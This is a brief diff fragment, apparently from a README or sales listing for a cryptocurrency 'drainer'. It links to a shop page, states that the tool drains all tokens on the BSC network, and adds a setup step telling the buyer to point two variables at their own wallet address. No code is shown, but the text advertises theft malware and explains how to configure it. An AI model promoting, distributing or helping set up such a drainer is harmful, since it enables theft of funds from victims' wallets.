@@ -5,4 +5,4 @@ Buy Link:- https://bnbdrainer.sellix.io/product/64799b8f2ae60
 
 Details:-
 1. Drains all the token in the BSC Network 
-2. 
+2. Change $.inaddr ans $.incontract to your wallet address
